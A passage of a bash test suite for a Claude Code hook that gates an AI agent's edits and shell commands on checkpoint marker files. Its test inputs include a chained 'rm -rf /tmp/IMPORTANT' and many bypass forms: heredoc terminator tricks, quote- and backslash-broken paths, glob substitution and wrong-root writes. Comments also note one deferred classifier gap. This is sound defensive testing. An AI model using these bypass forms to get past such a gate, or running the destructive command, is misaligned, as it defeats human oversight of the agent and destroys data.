assert_blocked "84b. <<'EOF' + rm chain — arms + blocks (shared_write, F1 closed)" \
  "$(mock_json 'Bash' "$heredoc_quoted_evil")" "Checkpoint required"

# Pure heredoc (regression): no post-EOF content → still allowed
pure_heredoc="cat > $PRE_DONE <<EOF
rule18 checkpoint
EOF"
assert_allowed "85. Pure heredoc to marker (regression) — still allowed" \
  "$(mock_json 'Bash' "$pure_heredoc")"

# Pure heredoc with trailing whitespace/newline after EOF — still allowed
pure_heredoc_ws="cat > $PRE_DONE <<EOF
rule18
EOF

"
assert_allowed "86. Pure heredoc + trailing whitespace — still allowed" \
  "$(mock_json 'Bash' "$pure_heredoc_ws")"

# ============================================================================
echo ""
echo "--- #75: extended terminator forms (PR-B2 #351: shared_write chains arm + block) ---"
# ============================================================================
# Per Step-6 adversarial probe of #73 fix: <<\EOF (backslash-escaped) and
# <<123 (digit-start) terminators were valid bash forms my initial sed regex
# didn't extract, leaving the bypass open. Fix: more permissive terminator
# class allowing any non-whitespace non-special chars + optional leading \.

# <<\EOF (backslash-escaped) with post-EOF chain — should block
heredoc_backslash='cat > '"$PRE_DONE"' <<\EOF
rule18
EOF
rm -rf /tmp/IMPORTANT'
assert_blocked "87. <<\\EOF backslash-escaped terminator + rm chain — arms + blocks (shared_write, #75)" \
  "$(mock_json 'Bash' "$heredoc_backslash")" "Checkpoint required"

# <<123 (numeric-only terminator) with post chain
heredoc_numeric='cat > '"$PRE_DONE"' <<123
rule18
123
rm -rf /tmp/IMPORTANT'
assert_blocked "88. <<123 numeric-only terminator + rm chain — arms + blocks (shared_write, #75)" \
  "$(mock_json 'Bash' "$heredoc_numeric")" "Checkpoint required"

# <<==EOF== (special chars in terminator) — bash valid
heredoc_special='cat > '"$PRE_DONE"' <<==EOF==
rule18
==EOF==
rm -rf /tmp/IMPORTANT'
assert_blocked "89. <<==EOF== special-char terminator + rm chain — arms + blocks (shared_write, #75)" \
  "$(mock_json 'Bash' "$heredoc_special")" "Checkpoint required"

# Regression: <<\EOF without post-EOF content still allowed
heredoc_backslash_pure='cat > '"$PRE_DONE"' <<\EOF
literal $stuff
EOF'
assert_allowed "90. <<\\EOF without chain — still allowed (regression)" \
  "$(mock_json 'Bash' "$heredoc_backslash_pure")"

# ============================================================================
echo ""
echo "--- Hook composition with plan-gate.sh (RFC-002:215) ---"
# ============================================================================
# Spec requires both hooks compose correctly when registered together as
# PreToolUse hooks: each runs independently, blocks independently, and
# does not interfere with the other's marker state.
#
# This test exercises both hooks sequentially against a shared cwd to
# verify no cross-hook marker contamination and that error messages are
# distinguishable.
PLAN_GATE_REPO="$REPO_ROOT/plugins/claude-code/hooks/plan-gate.sh"
PLAN_GATE_USER="$HOME/.claude/hooks/plan-gate.sh"
# Prefer a repo-staged copy if one ever lands at hooks/plan-gate.sh; otherwise
# fall back to the user-installed hook (same convention as tests/test-plan-gate.sh:10).
# Pre-fix this path was $REPO_ROOT/../plan-gate.sh — pointing at the
# worktrees parent dir, not the repo's hooks/ — never finding a future
# repo-staged copy. Latent until the user-installed copy is removed.
if [ -x "$PLAN_GATE_REPO" ]; then
  PLAN_GATE="$PLAN_GATE_REPO"
elif [ -x "$PLAN_GATE_USER" ]; then
  PLAN_GATE="$PLAN_GATE_USER"
else
  PLAN_GATE=""
fi

if [ -z "$PLAN_GATE" ]; then
  echo "  ⊘ Skipping composition tests — plan-gate.sh not found at $PLAN_GATE_REPO or $PLAN_GATE_USER"
else
  reset_state
  # .checkpoints/ migration: setup writes plan-marker at LEGACY (.claude/) to
  # exercise the dual-root fallback read; checkpoint-gate's reset_state no
  # longer mkdirs the legacy dir, so create it here.
  PLAN_MARKER="$TEST_DIR/.claude/.plan-approval-pending"
  mkdir -p "$TEST_DIR/.claude"
  touch "$PRE_REQ"
  touch "$PLAN_MARKER"

  # Both gates active: each fires its own block reason
  json=$(mock_json 'Edit')
  plan_out=$(echo "$json" | HOME="$TEST_HOME" bash "$PLAN_GATE" 2>/dev/null || true)
  if echo "$plan_out" | grep -q "Plan approval pending"; then
    echo "  ✓ 58. plan-gate blocks Edit when .plan-approval-pending exists"
    ((passed++))
  else
    echo "  ✗ 58. plan-gate did not block (output=$plan_out)"
    ((failed++))
  fi

  cp_out=$(echo "$json" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null || true)
  if echo "$cp_out" | grep -q "Checkpoint required"; then
    echo "  ✓ 59. checkpoint-gate blocks Edit when .checkpoint-required exists"
    ((passed++))
  else
    echo "  ✗ 59. checkpoint-gate did not block (output=$cp_out)"
    ((failed++))
  fi

  # Distinct error messages — block reasons must be distinguishable
  if [ "$plan_out" != "$cp_out" ]; then
    echo "  ✓ 60. plan-gate and checkpoint-gate produce distinct block messages"
    ((passed++))
  else
    echo "  ✗ 60. block messages are identical"
    ((failed++))
  fi

  # No marker contamination — neither hook touched the other's marker
  if [ -f "$PLAN_MARKER" ] && [ -f "$PRE_REQ" ]; then
    echo "  ✓ 61. Both markers preserved after both hooks run (no cross-contamination)"
    ((passed++))
  else
    echo "  ✗ 61. Marker missing after composition (plan=$([ -f "$PLAN_MARKER" ] && echo Y || echo N) cp=$([ -f "$PRE_REQ" ] && echo Y || echo N))"
    ((failed++))
  fi

  # Clear plan marker — checkpoint-gate still blocks independently
  rm -f "$PLAN_MARKER"
  plan_out2=$(echo "$json" | HOME="$TEST_HOME" bash "$PLAN_GATE" 2>/dev/null || true)
  cp_out2=$(echo "$json" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null || true)
  if [ -z "$plan_out2" ] && echo "$cp_out2" | grep -q "Checkpoint required"; then
    echo "  ✓ 62. checkpoint-gate continues to block after plan-gate marker cleared"
    ((passed++))
  else
    echo "  ✗ 62. independent operation broke (plan_out2=$plan_out2 cp_out2=$cp_out2)"
    ((failed++))
  fi
fi

# ============================================================================
echo ""
echo "--- #146 B1: block-reason includes ABSOLUTE marker path ---"
# ============================================================================
# Pre-fix (issue #146 live reproducer): block reason said
# ".claude/.pre-checkpoint-done" (relative). Agent in worktree cwd resolved
# the relative path against the worktree, which mismatched the gate's
# main-repo expectation, deadlocking. Fix: emit absolute marker path so
# the agent writes to the correct location regardless of cwd.
reset_state
touch "$PRE_REQ"
b1_out=$(echo "$(mock_json 'Edit')" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null || true)
# .checkpoints/ migration: block reason embeds the PRIMARY write path so
# the agent writes to the new location.
B1_EXPECTED="$TEST_DIR/.checkpoints/.pre-checkpoint-done"
if echo "$b1_out" | grep -qF "$B1_EXPECTED"; then
  echo "  ✓ B1.pre. _block_pre reason embeds absolute pre-checkpoint path"
  ((passed++))
else
  echo "  ✗ B1.pre. expected absolute path '$B1_EXPECTED' in: $b1_out"
  ((failed++))
fi
# Defensive: the trigger marker .checkpoint-required still exists AND the
# asserted path string equals the gate's resolved $PRE_DONE constant.
if [ -f "$PRE_REQ" ] && [ "$PRE_DONE" = "$B1_EXPECTED" ]; then
  echo "  ✓ B1.pre (defensive): trigger marker present + path string matches \$PRE_DONE"
  ((passed++))
else
  echo "  ✗ B1.pre defensive: trigger=$([ -f "$PRE_REQ" ] && echo Y || echo N) PRE_DONE=$PRE_DONE expected=$B1_EXPECTED"
  ((failed++))
fi
# Plan-pending block reason also gets absolute path. Setup writes the
# legacy-path marker (exercises fallback read); block message references
# the PRIMARY write path (where the agent should put any new marker).
reset_state
touch "$PRE_REQ"
PLAN_MARKER_LEGACY="$TEST_DIR/.claude/.plan-approval-pending"
PLAN_MARKER_PRIMARY="$TEST_DIR/.checkpoints/.plan-approval-pending"
mkdir -p "$TEST_DIR/.claude"
touch "$PLAN_MARKER_LEGACY"
# A Bash command targeting the pre-checkpoint marker fires the
# plan-pending block (cross-gate invariant). Reason should embed
# the absolute PRIMARY plan-pending path.
plan_block_json=$(jq -nc \
  --arg cmd "echo block > $PRE_DONE" \
  --arg cwd "$TEST_DIR" \
  '{tool_name: "Bash", cwd: $cwd, tool_input: {command: $cmd}}')
plan_out=$(echo "$plan_block_json" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null || true)
if echo "$plan_out" | grep -qF "$PLAN_MARKER_PRIMARY"; then
  echo "  ✓ B1.plan. _block_plan_pending reason embeds absolute plan-pending path (primary)"
  ((passed++))
else
  echo "  ✗ B1.plan. expected absolute path '$PLAN_MARKER_PRIMARY' in: $plan_out"
  ((failed++))
fi
rm -f "$PLAN_MARKER_LEGACY"

# ============================================================================
echo ""
echo "--- A8: hook does not pollute REPO_ROOT outside TEST_DIR ---"
# ============================================================================
# Regression guard mirroring test-em-recall-sessionstart.sh test 7. Snapshot
# REPO_ROOT contents before/after a hook invocation; assert no new entries.
REPO_ROOT_BEFORE=$(ls -A "$REPO_ROOT" | sort)
echo "$(mock_json 'Edit')" | HOME="$TEST_HOME" bash "$HOOK" >/dev/null 2>&1 || true
REPO_ROOT_AFTER=$(ls -A "$REPO_ROOT" | sort)
if [ "$REPO_ROOT_BEFORE" = "$REPO_ROOT_AFTER" ]; then
  echo "  ✓ 63. checkpoint-gate.sh does not pollute REPO_ROOT"
  ((passed++))
else
  echo "  ✗ 63. checkpoint-gate.sh polluted REPO_ROOT:"
  diff <(echo "$REPO_ROOT_BEFORE") <(echo "$REPO_ROOT_AFTER")
  ((failed++))
fi

# ============================================================================
echo ""
echo "--- B: Wrong-root marker write detection (rank-1 plan v7) ---"
# ============================================================================
# Codex-reviewed 7 rounds; final ACCEPT-with-FU at episode ...e19a.
# Tests the new helpers in checkpoint-gate.sh:
#   _marker_basename_in_set, _normalize_path_lexical, _is_canonical_marker_path,
#   _command_has_relative_marker_path, _block_wrong_root_marker,
#   _block_relative_marker_in_worktree, _is_wrong_root_marker_write.

reset_state

# B-tests need a SECOND cwd that is NOT the main repo root, to simulate
# worktree-cwd OR nested-cwd within main. Create both shapes.
WORKTREE_DIR="$(mktemp -d)"
WORKTREE_DIR="$(cd -P "$WORKTREE_DIR" && pwd)"
# Make WORKTREE_DIR a linked worktree of TEST_DIR (so resolve_repo_root from
# WORKTREE_DIR returns TEST_DIR via git-common-dir).
git -C "$TEST_DIR" config user.email t@t 2>/dev/null
git -C "$TEST_DIR" config user.name t 2>/dev/null
echo x > "$TEST_DIR/README.md"
git -C "$TEST_DIR" add . >/dev/null 2>&1
git -C "$TEST_DIR" commit -q -m init 2>/dev/null
rmdir "$WORKTREE_DIR"
git -C "$TEST_DIR" worktree add -q -b test-wt-branch "$WORKTREE_DIR" 2>/dev/null
WORKTREE_DIR="$(cd -P "$WORKTREE_DIR" && pwd)"

# Nested cwd inside main repo (codex F18)
NESTED_DIR="$TEST_DIR/subdir"
mkdir -p "$NESTED_DIR"

# Arm the gate (checkpoint-required), but DON'T pre-create pre-done — so
# the gate's pre-gate would block any allowed write. The B-tests assert
# the EARLIER wrong-root checks fire BEFORE the pre-gate, with their
# specific reason strings.
touch "$PRE_REQ"

mock_json_cwd() {
  local tool_name="$1" command="$2" cwd="$3"
  jq -n --arg tn "$tool_name" --arg cmd "$command" --arg cwd "$cwd" \
    '{tool_name: $tn, tool_input: {command: $cmd}, cwd: $cwd}'
}

mock_json_write() {
  local file_path="$1" cwd="$2"
  jq -n --arg fp "$file_path" --arg cwd "$cwd" \
    '{tool_name: "Write", tool_input: {file_path: $fp, content: "x"}, cwd: $cwd}'
}

# ---- Absolute-path wrong-root (codex F1/F7) ----

assert_blocked "B-1. Bash: rm worktree-absolute marker → wrong-root block" \
  "$(mock_json_cwd 'Bash' "rm $WORKTREE_DIR/.checkpoints/.pre-checkpoint-done" "$WORKTREE_DIR")" \
  "non-canonical path"

assert_blocked "B-2. Write: worktree-absolute marker → wrong-root block" \
  "$(mock_json_write "$WORKTREE_DIR/.checkpoints/.post-checkpoint-done" "$WORKTREE_DIR")" \
  "non-canonical path"

assert_blocked "B-3. Bash: outside-repo absolute marker → wrong-root block" \
  "$(mock_json_cwd 'Bash' "echo x > /tmp/.checkpoints/.pre-checkpoint-done" "$WORKTREE_DIR")" \
  "non-canonical path"

assert_blocked "B-4. Write: worktree legacy .claude/ absolute → wrong-root block" \
  "$(mock_json_write "$WORKTREE_DIR/.claude/.plan-approval-pending" "$WORKTREE_DIR")" \
  "non-canonical path"

# ---- No false-positive on canonical paths of markers outside the 3-marker
# allowlist (codex F7 — Bash redirects to canonical .checkpoint-required /
# .preflight-done / .last-user-prompt.*.json should NOT trigger wrong-root) ----
# Setup: satisfy pre-gate (PRE_DONE non-empty) so we test the WRONG-ROOT
# branch only, not the orthogonal pre-checkpoint pre-gate.
echo "pre-block" > "$PRE_DONE"

# Asserts that the SPECIFIC wrong-root block does NOT fire. Other blocks
# (push-gate, plan-gate) may still fire — we check the reason substring.
assert_no_wrong_root_block() {
  local test_name="$1"
  local json="$2"
  local output
  output=$(echo "$json" | run_hook 2>/dev/null)
  if echo "$output" | grep -qE 'non-canonical path|Relative marker reference'; then
    echo "  ✗ $test_name (wrong-root falsely fired): $output"
    ((failed++))
  else
    echo "  ✓ $test_name"
    ((passed++))
  fi
}

assert_no_wrong_root_block "B-5. Bash: canonical main .checkpoint-required (no FP)" \
  "$(mock_json_cwd 'Bash' "echo x > $MARKER_DIR/.checkpoint-required" "$TEST_DIR")"

assert_no_wrong_root_block "B-6. Bash: canonical main .preflight-done (no FP)" \
  "$(mock_json_cwd 'Bash' "echo x > $MARKER_DIR/.preflight-done" "$TEST_DIR")"

assert_no_wrong_root_block "B-7. Bash: canonical main .last-user-prompt (no FP)" \
  "$(mock_json_cwd 'Bash' "echo x > $MARKER_DIR/.last-user-prompt.json" "$TEST_DIR")"

# Restore pre-done empty for remaining tests (pre-gate state)
: > "$PRE_DONE"
rm -f "$PRE_DONE"

# ---- Relative-marker precheck from worktree cwd (codex F10, F12, F15) ----

assert_blocked "B-8. Bash: relative '> .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'echo x > .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_allowed "B-9. Bash: relative '> .checkpoints/<marker>' from MAIN" \
  "$(mock_json_cwd 'Bash' "echo x > .checkpoints/.pre-checkpoint-done" "$TEST_DIR")"

assert_blocked "B-10. Bash: 'touch .checkpoints/<marker>' from worktree (F12 verb-agnostic)" \
  "$(mock_json_cwd 'Bash' 'touch .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-11. Bash: 'mv /tmp/x .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'mv /tmp/x .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-12. Bash: 'cp /tmp/x .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'cp /tmp/x .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-13. Bash: 'dd of=.checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'dd if=/tmp/x of=.checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-14. Bash: '> ./.checkpoints/<marker>' from worktree → block" \
  "$(mock_json_cwd 'Bash' 'echo x > ./.checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# B-14b sanity: same shape from MAIN cwd → wrong-root block does NOT fire
# (CWD == REPO_ROOT means precheck skips; the pre-gate may still fire — we
# only assert the wrong-root reason is absent).
assert_no_wrong_root_block "B-14b. Bash: './.checkpoints/<marker>' from MAIN cwd → no wrong-root FP" \
  "$(mock_json_cwd 'Bash' 'echo x > ./.checkpoints/.pre-checkpoint-done' "$TEST_DIR")"

assert_blocked "B-15. Bash: 'rm .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'rm .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# ---- Codex F16 — verb fan-out: install, cat >>, heredoc ----

assert_blocked "B-16. Bash: 'install /tmp/x .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'install /tmp/x .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-17. Bash: 'cat /tmp/x >> .checkpoints/<marker>' from worktree" \
  "$(mock_json_cwd 'Bash' 'cat /tmp/x >> .checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# B-18 (codex F16 heredoc): DEFERRED — classifier mis-labels
# `cat <<EOF > .checkpoints/<marker>\nx\nEOF` as read_only, so the precheck
# (which only runs for non-read_only) doesn't fire. This is a classifier
# bug separate from the wrong-root cluster. Tracked as FU: "classifier
# heredoc-with-redirect mis-classification" (see PR description).
# The 7 other verbs (touch, mv, cp, install, dd, redirect, rm, tee, cat>>)
# are covered by B-8/B-10/B-11/B-12/B-13/B-14/B-15/B-16/B-17.

# ---- Codex F15 — `./` and `././` prefix chains ----

assert_blocked "B-19. Bash: '> ./.checkpoints/<marker>' worktree" \
  "$(mock_json_cwd 'Bash' 'echo x > ./.checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# B-20 is the canonical-main same shape allowed; B-14b above covers it. Skip duplicate.

assert_blocked "B-21. Bash: '> ././.checkpoints/<marker>' worktree (chained ./)" \
  "$(mock_json_cwd 'Bash' 'echo x > ././.checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-22. Bash: 'touch ./.checkpoints/<marker>' worktree (./ + touch)" \
  "$(mock_json_cwd 'Bash' 'touch ./.checkpoints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# ---- Codex F18 — nested-cwd (not a worktree, just inside main repo) ----

assert_blocked "B-23. Bash: relative marker from nested cwd inside main repo" \
  "$(mock_json_cwd 'Bash' 'echo x > .checkpoints/.pre-checkpoint-done' "$NESTED_DIR")" \
  "Relative marker reference"

# Disk assertions (B-23a/b/c): block didn't write either nested or canonical
assert_marker_absent "B-23a. After B-23: nested marker NOT created" \
  "$NESTED_DIR/.checkpoints/.pre-checkpoint-done"
assert_marker_absent "B-23b. After B-23: canonical marker NOT created (no PRE_DONE write)" \
  "$PRE_DONE"
assert_marker_exists "B-23c. After B-23: trigger marker (PRE_REQ) preserved" \
  "$PRE_REQ"

# ---- Code-review A1 — quote-broken bypasses ----
# Bash quoting that breaks the contiguous `.checkpoints/<marker>` substring
# must still be detected because the shell evaluates the quotes before
# the actual write occurs.

assert_blocked "B-24 (A1). Bash: touch with double-quoted .checkpoints from worktree" \
  "$(mock_json_cwd 'Bash' 'touch ".checkpoints"/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-25 (A1). Bash: touch with single-quoted .checkpoints from worktree" \
  "$(mock_json_cwd 'Bash' "touch '.checkpoints'/.pre-checkpoint-done" "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-26 (A1). Bash: echo with single-quoted marker basename from worktree" \
  "$(mock_json_cwd 'Bash' "echo x > .checkpoints/'.pre-checkpoint-done'" "$WORKTREE_DIR")" \
  "Relative marker reference"

assert_blocked "B-27 (A1). Bash: backslash-broken marker from worktree" \
  "$(mock_json_cwd 'Bash' 'touch .checkpo\ints/.pre-checkpoint-done' "$WORKTREE_DIR")" \
  "Relative marker reference"

# ---- Code-review A2 — absolute non-canonical from MAIN cwd (shared_write verbs) ----
# Pre-fix the absolute-noncanonical detection was gated on CWD != REPO_ROOT,
# so `touch /tmp/.checkpoints/<marker>` from main cwd fell through to
# shared_write -> pre-gate. Now it must block as wrong-root.

assert_blocked "B-28 (A2). Bash: touch /tmp/.checkpoints/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "touch /tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

assert_blocked "B-29 (A2). Bash: mv to /tmp/.checkpoints/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "mv /tmp/x /tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

assert_blocked "B-30 (A2). Bash: cp to /tmp/.checkpoints/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "cp /tmp/x /tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

assert_blocked "B-31 (A2). Bash: install to /tmp/.checkpoints/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "install /tmp/x /tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

assert_blocked "B-32 (A2). Bash: dd of=/tmp/.checkpoints/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "dd if=/tmp/x of=/tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

# A2 no-FP: canonical absolute marker from MAIN cwd should still NOT
# trigger the wrong-root block (predicate filters canonical paths).
assert_no_wrong_root_block "B-33 (A2 no-FP). Bash: touch on canonical $MARKER_DIR/<marker> from MAIN cwd" \
  "$(mock_json_cwd 'Bash' "touch $MARKER_DIR/.checkpoint-required" "$TEST_DIR")"

# ---- PR-level review P1 regression — occurrence-scoped relative-vs-absolute ----
# Codex caught: a benign mention of `./<absolute-path>` in part of the command
# was making the global filter skip the absolute-write check for the WHOLE
# command, allowing a separate real wrong-root write elsewhere.

assert_blocked "B-34 (codex PR P1). benign mention + real wrong-root write → still blocks" \
  "$(mock_json_cwd 'Bash' "echo ./tmp/.checkpoints/.pre-checkpoint-done >/dev/null; touch /tmp/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

# Defensive: pure benign mention (no real write) should still NOT block
# (avoid over-correction — we want occurrence-scoped, not blunt always-block)
assert_no_wrong_root_block "B-35 (codex PR P1 no-FP). pure relative mention without absolute write → no block" \
  "$(mock_json_cwd 'Bash' "echo x > ./.checkpoints/.pre-checkpoint-done" "$TEST_DIR")"

# B-36 (codex PR round-2 P1): bash pattern substitution glob bypass.
# Pre-fix: `${cmd//\.${p}/}` interpreted `*` in $p as glob, over-matching
# both the relative mention AND the absolute write occurrences, defeating
# the occurrence-scoped check. With glob-escape, `$p` is treated literally.
assert_blocked "B-36 (codex PR round-2 P1). glob-metachar bypass → still blocks" \
  "$(mock_json_cwd 'Bash' "echo ./tmp/emglob*/.checkpoints/.pre-checkpoint-done >/dev/null; touch /tmp/emglob*/.checkpoints/.pre-checkpoint-done" "$TEST_DIR")" \
  "non-canonical path"

# B-37 (codex PR round-2 P1 no-FP): pure relative glob-metachar mention
# from main cwd should still NOT block (pattern literal in residual check).
assert_no_wrong_root_block "B-37 (codex PR round-2 P1 no-FP). pure relative glob mention → no block" \
  "$(mock_json_cwd 'Bash' "echo x > ./.checkpoints/.pre-checkpoint-done; echo also ./tmp/glob?/.checkpoints/.checkpoint-required" "$TEST_DIR")"

# Cleanup B-test worktree
git -C "$TEST_DIR" worktree remove --force "$WORKTREE_DIR" 2>/dev/null
git -C "$TEST_DIR" branch -D test-wt-branch 2>/dev/null

# ============================================================================
# B-S: paths-with-spaces wrong-root detector (codex R1-R8 / PR #<TBD>)
#
# Covers the bug class where `_command_first_absolute_noncanonical_marker`
# truncated absolute marker paths at the first whitespace, breaking marker
# operations in any repo whose absolute path contains a space (e.g.
# "Home Network Improvement").
#
# Implementation: three-pass per-token scan (whole-token equality, key=path
# walk, substring-regex with canonical short-circuit + relative disambig).
# ============================================================================

# ---- B-S helpers ----

# Run hook from an explicit caller process cwd (different from JSON .cwd) so
# B-S9 / B-S13 / B-S26 actually exercise the caller-cwd ≠ JSON-cwd axis.
run_hook_from_cwd() {
  local caller_cwd="$1"
  (cd "$caller_cwd" && HOME="$TEST_HOME" bash "$HOOK")
}

# Assert hook blocks AND reason JSON contains BOTH expected-attempted and
# expected-canonical path literals (substring match via grep -qF / jq -r).
assert_blocked_with_reason() {
  local test_name="$1" json="$2" expected_attempted="$3" expected_canonical="$4"
  local output reason exit_code=0
  output=$(echo "$json" | run_hook 2>/dev/null) || exit_code=$?
  if ! echo "$output" | grep -q '"decision".*"block"'; then
    echo "  ✗ $test_name (expected block; exit=$exit_code output=$output)"
    ((failed++))
    return
  fi
  reason=$(echo "$output" | jq -r '.reason // ""' 2>/dev/null)
  if [ -z "$reason" ] || ! printf '%s' "$reason" | grep -qF -- "$expected_attempted"; then
    echo "  ✗ $test_name (reason missing attempted='$expected_attempted'): $reason"
    ((failed++))
    return
  fi
  if ! printf '%s' "$reason" | grep -qF -- "$expected_canonical"; then
    echo "  ✗ $test_name (reason missing canonical='$expected_canonical'): $reason"
    ((failed++))
    return
  fi
  echo "  ✓ $test_name"
  ((passed++))
}

# Paired disk assertion (B-S26): target marker exists (fixture-seeded);
# caller cwd has no leaked .checkpoints/ dir.
assert_disk_artifacts() {
  local test_name="$1" target_marker_path="$2" caller_cwd="$3"
  if [ ! -e "$target_marker_path" ]; then
    echo "  ✗ $test_name (target marker missing: $target_marker_path)"
    ((failed++))
    return
  fi
  if [ -e "$caller_cwd/.checkpoints" ]; then
    echo "  ✗ $test_name (caller-cwd leak: $(ls -la "$caller_cwd/.checkpoints" 2>&1))"
    ((failed++))
    return
  fi
  echo "  ✓ $test_name (disk artifacts: target=$target_marker_path, caller no-leak)"
  ((passed++))
}

# ---- B-S fixture: spacey main repo + spacey linked worktree ----

SPACE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/em-space test.XXXXXX")"
SPACE_DIR="$(cd -P "$SPACE_DIR" && pwd)"
git -C "$SPACE_DIR" init -q 2>/dev/null
mkdir -p "$SPACE_DIR/.checkpoints"
touch "$SPACE_DIR/.checkpoints/.checkpoint-required"
git -C "$SPACE_DIR" -c user.email=t@t.test -c user.name=test commit --allow-empty -m init -q

SPACE_DIR_WT="$(mktemp -d "${TMPDIR:-/tmp}/em-space wt.XXXXXX")"
SPACE_DIR_WT="$(cd -P "$SPACE_DIR_WT" && pwd)"
rmdir "$SPACE_DIR_WT"

# R6 P1.1: explicit -b avoids invalid-ref-name from spacey basename
# (git would otherwise infer the branch as `em-space wt.xxxx` and fail).
if ! git -C "$SPACE_DIR" worktree add -b test-spacey-wt-branch "$SPACE_DIR_WT" -q; then
  echo "FAIL: B-S fixture: git worktree add failed (spacey basename branch-inference bug?)"
  exit 1
fi

# Fixture precondition: worktree's git-common-dir resolves to main repo.
B_S_EXPECTED_COMMON_DIR="$SPACE_DIR/.git"
B_S_ACTUAL_COMMON_DIR="$(git -C "$SPACE_DIR_WT" rev-parse --git-common-dir)"
case "$B_S_ACTUAL_COMMON_DIR" in
  /*) ;;
  *) B_S_ACTUAL_COMMON_DIR="$SPACE_DIR_WT/$B_S_ACTUAL_COMMON_DIR" ;;
esac
B_S_ACTUAL_COMMON_DIR="$(cd -P "$B_S_ACTUAL_COMMON_DIR" 2>/dev/null && pwd)" || true
if [ "$B_S_ACTUAL_COMMON_DIR" != "$B_S_EXPECTED_COMMON_DIR" ]; then
  echo "FAIL: B-S fixture: common-dir resolved to '$B_S_ACTUAL_COMMON_DIR'; expected '$B_S_EXPECTED_COMMON_DIR'"
  exit 1
fi

# Nested subdir under spacey repo (for B-S11).
SPACE_DIR_NESTED="$SPACE_DIR/sub dir"
mkdir -p "$SPACE_DIR_NESTED"

# Clean-name canonical repo (for B-S16): canonical bash -c without spaces.
CLEAN_DIR="$(mktemp -d "${TMPDIR:-/tmp}/em-clean.XXXXXX")"
CLEAN_DIR="$(cd -P "$CLEAN_DIR" && pwd)"
git -C "$CLEAN_DIR" init -q 2>/dev/null
mkdir -p "$CLEAN_DIR/.checkpoints"

# ---- B-S cases ----

# B-S1: quoted canonical absolute path-with-space → no wrong-root block
assert_no_wrong_root_block "B-S1. Quoted canonical path-with-space" \
  "$(mock_json_cwd 'Bash' "rm \"$SPACE_DIR/.checkpoints/.plan-approval-pending\"" "$SPACE_DIR")"

# B-S2: quoted non-canonical absolute path-with-space (different repo) → BLOCK
assert_blocked_with_reason "B-S2. Quoted non-canonical path-with-space" \
  "$(mock_json_cwd 'Bash' "rm \"/tmp/some other repo/.checkpoints/.pre-checkpoint-done\"" "$SPACE_DIR")" \
  "/tmp/some other repo/.checkpoints/.pre-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.pre-checkpoint-done"

# B-S3: touch quoted canonical with space → allow
assert_no_wrong_root_block "B-S3. touch quoted canonical with space" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")"

# B-S4: redirect to quoted canonical with space → allow
assert_no_wrong_root_block "B-S4. Redirect to quoted canonical with space" \
  "$(mock_json_cwd 'Bash' "echo done > \"$SPACE_DIR/.checkpoints/.pre-checkpoint-done\"" "$SPACE_DIR")"

# B-S5: cp to quoted non-canonical /tmp marker path-with-space → BLOCK
assert_blocked_with_reason "B-S5. cp to non-canonical /tmp path-with-space" \
  "$(mock_json_cwd 'Bash' "cp /etc/hosts \"/tmp/wrong dir/.checkpoints/.plan-approval-pending\"" "$SPACE_DIR")" \
  "/tmp/wrong dir/.checkpoints/.plan-approval-pending" \
  "$SPACE_DIR/.checkpoints/.plan-approval-pending"

# B-S6: single-quoted non-canonical absolute path-with-space → BLOCK
assert_blocked_with_reason "B-S6. Single-quoted non-canonical path-with-space" \
  "$(mock_json_cwd 'Bash' "rm '/tmp/another dir/.checkpoints/.post-checkpoint-done'" "$SPACE_DIR")" \
  "/tmp/another dir/.checkpoints/.post-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.post-checkpoint-done"

# B-S7: multiple markers; first is non-canonical → BLOCK
assert_blocked_with_reason "B-S7. Multiple markers, first non-canonical" \
